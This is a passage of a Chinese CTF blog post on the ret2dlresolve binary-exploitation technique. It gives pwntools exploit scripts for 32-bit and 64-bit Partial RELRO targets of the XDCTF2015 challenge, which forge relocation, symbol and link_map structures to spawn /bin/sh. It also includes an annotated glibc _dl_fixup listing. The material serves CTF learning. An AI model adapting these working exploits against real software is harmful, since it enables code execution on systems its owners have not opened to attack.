+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line">sh = process(&#x27;./pwn-x86-lazy&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn-x86-lazy&#x27;)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&#x27;read&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">bss = elf.bss() + 0x600 + 4</span><br><span class="line">plt_0 = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(&#x27;.rel.plt&#x27;).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addr</span><br><span class="line"></span><br><span class="line">ppp_ret = 0x08048649</span><br><span class="line">p_ebp_r = 0x0804864b</span><br><span class="line">leave_ret = 0x08048465</span><br><span class="line"></span><br><span class="line">reloc_index = bss + 28 - rel_plt</span><br><span class="line">align = 0x10 - ((bss + 36 - dynsym) % 0x10)</span><br><span class="line">success(&#x27;align: &#x27; + hex(align))</span><br><span class="line">r_info = ((bss + 36 + align - dynsym) &lt;&lt; 4) + 0x7</span><br><span class="line">st_name = bss + 60 + align - dynstr</span><br><span class="line">fake_rel = flat(write_got,     # r_offset</span><br><span class="line">                r_info         # r_info</span><br><span class="line">                )</span><br><span class="line">fake_sym = flat(st_name,       # st_name</span><br><span class="line">                0,             # st_value</span><br><span class="line">                0,             # st_size</span><br><span class="line">                0x12,          # st_info</span><br><span class="line">                0,             # st_other</span><br><span class="line">                0              # st_shndx</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">pld = b&#x27;a&#x27; * 0x70</span><br><span class="line">pld += flat([read_plt, ppp_ret, 0, bss, 0x100,</span><br><span class="line">             p_ebp_r, bss, leave_ret])</span><br><span class="line">sh.recvuntil(&#x27;Welcome to XDCTF2015~!\n&#x27;)</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">pld = flat(0,</span><br><span class="line">           plt_0,</span><br><span class="line">           reloc_index,</span><br><span class="line">           0,</span><br><span class="line">           (bss + 0xa0), 0, 0,</span><br><span class="line">           fake_rel,</span><br><span class="line">           b&#x27;\x00&#x27; * align, </span><br><span class="line">           fake_sym,</span><br><span class="line">           &#x27;execve\x00&#x27;</span><br><span class="line">           )</span><br><span class="line">pld = pld.ljust(0xa0, b&#x27;\x00&#x27;) + b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="x64-1"><a href="#x64-1" class="headerlink" title="x64"></a>x64</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -z lazy pwn.c -o pwn-x64-norelro</span><br></pre></td></tr></table></figure>
+
+<p>相比较32位的利用手法，64位需要多绕过一个检查，贴一位师傅注释的源码：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51868336/article/details/114644569">(14条消息) ret2dlresolve超详细教程(x86&amp;x64)_77Pray的博客-CSDN博客</a></p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (<span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取 link_map 中存放 DT_SYMTAB 的地址</span></span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">// 获取 link_map 中存放 DT_STRTAB 的地址</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">	<span class="comment">// reloc_offset 就是 reloc_arg，获取重定位表项中对应函数的结构体</span></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 根据重定位结构体的 r_info 得到 symtab 表中对应的结构体</span></span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    </span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); <span class="comment">// 检查 r_info 的最低位是不是7</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">    <span class="comment">// 这里是一层检测，检查sym结构体中的 st_other 是否为0，正常情况下为0，执行下面代码</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 这里也是一层检测，检查 link_map 中的 DT_VERSYM 是否为NULL，正常情况下不为NULL，执行下面代码</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">      <span class="comment">// 到了这里就是64位下报错的位置。在计算版本号时，由于我们一般伪造的symtab位于bss段，就导致在64位下 reloc-&gt;r_info 比较大，故程序会发生错误。</span></span><br><span class="line">      <span class="comment">// 第一种绕过手段就是使上一行的if不成立，也就是设置 link_map 中的 DT_VERSYM 为 NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。</span></span><br><span class="line">      <span class="comment">// 第二种绕过手段就是使最外层的if不成立，也就是使sym结构体中的 st_other 不为0。</span></span><br><span class="line">	  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    version = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">	 not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">	 we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	&#123;</span><br><span class="line">	  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">	  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line">	<span class="comment">// 在32位情况下，上面代码运行中不会出错，就会走到这里</span></span><br><span class="line">    <span class="comment">// 这里通过 strtab + sym-&gt;st_name 找到符号表字符串，result 为libc基地址</span></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">	 offset.  */</span></span><br><span class="line">      <span class="comment">// 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即 result + st_value</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123; </span><br><span class="line">      <span class="comment">// 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里</span></span><br><span class="line">      <span class="comment">// 我们的目的是使value为我们所需要的函数的地址，所以就得控制两个参数,l_addr 和 st_value</span></span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">	 address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  <span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过阅读源码，我们明确了目的：控制<code>l-&gt;l_addr</code>和<code>sym-&gt;st_value</code>的值，使得两者相加为目的函数的真实地址。</p>
+<p>先看一下link_map结构体的声明：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf64_Addr l_addr;</span><br><span class="line">    <span class="type">char</span> *l_name;</span><br><span class="line">    Elf64_Dyn *l_ld;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    Elf64_Dyn *l_info[<span class="number">76</span>];				<span class="comment">//l_info 里面包含的就是动态链接的各个表的信息</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="type">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line">    <span class="type">ptrdiff_t</span> l_tls_offset;</span><br><span class="line">    <span class="type">size_t</span> l_tls_modid;</span><br><span class="line">    <span class="type">size_t</span> l_tls_dtor_count;</span><br><span class="line">    Elf64_Addr l_relro_addr;</span><br><span class="line">    <span class="type">size_t</span> l_relro_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> l_serial;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span> <span class="title">l_audit</span>[];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>EXP如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn-x64-lazy&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-x64-lazy&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss = elf.bss() + <span class="number">0x100</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x00000000004007a3</span></span><br><span class="line">p_rsi_r15_r = <span class="number">0x00000000004007a1</span></span><br><span class="line">plt_jump_dl = <span class="number">0x0000000000400506</span></span><br><span class="line">ret = <span class="number">0x00000000004004fe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_linkmap_x64</span>(<span class="params">fake_linkmap_addr, func_got, offset</span>):</span><br><span class="line">    link_map = flat((offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)),           <span class="comment"># l_addr</span></span><br><span class="line">                    <span class="number">0</span>,                                  <span class="comment"># l_name</span></span><br><span class="line">                    fake_linkmap_addr + <span class="number">0x18</span>,           <span class="comment"># l_ld -&gt; Elf_Rel</span></span><br><span class="line">                    bss + <span class="number">0xc4000</span>,                      <span class="comment"># l_next -&gt; Elf_Rel-&gt;r_offset, addr is writeable</span></span><br><span class="line">                    <span class="number">0x7</span>,                                <span class="comment"># l_prev -&gt; Elf_Rel-&gt;r_info</span></span><br><span class="line">                    <span class="number">0</span>,                                  <span class="comment"># l_real -&gt; Elf_Rel-&gt;r_addend</span></span><br><span class="line">                    <span class="number">0</span>,                                  <span class="comment"># l_ns</span></span><br><span class="line">                    <span class="number">0</span>,                                  <span class="comment"># l_libname</span></span><br><span class="line">                    func_got - <span class="number">0x8</span>,                     <span class="comment"># l_info -&gt; Elf_Sym</span></span><br><span class="line">                    <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">                    )</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    link_map += flat(fake_linkmap_addr,                 <span class="comment"># DT_STRTAB</span></span><br><span class="line">                     fake_linkmap_addr + <span class="number">0x38</span>,          <span class="comment"># DT_SYMTAB</span></span><br><span class="line">                     )</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0xf8</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    link_map += flat(fake_linkmap_addr + <span class="number">0x8</span>)           <span class="comment"># DT_JMPREL</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">return</span> link_map</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">pld += flat(p_rdi_r, <span class="number">0</span>, p_rsi_r15_r, bss, <span class="number">0</span>, read_plt, ret,</span><br><span class="line">            p_rdi_r, bss + <span class="number">0x48</span>, plt_jump_dl, bss, <span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.send(fake_linkmap_x64(bss, write_got, libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;write&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h3><p>在该情况下，整个got表都只读，got表中的link_map和dl_runtime_resolve函数的地址都将是0，故而不能直接进行ret2dlresolve。不过如果能够找到输出函数或者是某段汇编泄露上述两者的地址的话，那还是有可能成功的。</p>
+<blockquote>
+<p>参考资料：</p>
+<p><a target="_blank" rel="noopener" href="https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO/#%E4%B8%80.-ret2dlresolve%E5%8E%9F%E7%90%86">Ret2dlresolve攻击——从No RELRO到FULL RELRO | T3stzer0’s Blog (testzero-wz.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.e4l4.com/posts/id=13/">ret2dl利用总结 | E4L4</a></p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Ret2dl-resolve/" rel="tag"># Ret2dl-resolve</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/07/27/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AB/" rel="next" title="渗透高度安全的内网">
+                <i class="fa fa-chevron-left"></i> 渗透高度安全的内网
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/08/08/CTF/2023Securinetsctf/" rel="prev" title="2023 Securinets CTF">
+                2023 Securinets CTF <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/wechat.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">61</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/pursuezhou" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:pursuezhou@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.eonew.cn/" title="Ex" target="_blank">Ex</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xianbeil.github.io/" title="XianBei" target="_blank">XianBei</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://whoamianony.top/" title="WHOAMI" target="_blank">WHOAMI</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.e4l4.com/" title="E4L4" target="_blank">E4L4</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tokameine.top/" title="Tokameine" target="_blank">Tokameine</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://toleleyjl.github.io/" title="Tolele" target="_blank">Tolele</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          <div class="wechat_OA">
+    <br>
+    <span>Welcome to my wechat</span>
+    <p></p>
+    <img src ="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/wechat.jpg" width="150" height="150">
+</div>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">利用手法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#No-RELRO"><span class="nav-number">2.1.</span> <span class="nav-text">No RELRO</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#x86"><span class="nav-number">2.1.1.</span> <span class="nav-text">x86</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x64"><span class="nav-number">2.1.2.</span> <span class="nav-text">x64</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Partial-RELRO"><span class="nav-number">2.2.</span> <span class="nav-text">Partial RELRO</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#x86-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">x86</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x64-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">x64</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Full-RELRO"><span class="nav-number">2.3.</span> <span class="nav-text">Full RELRO</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pursue</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
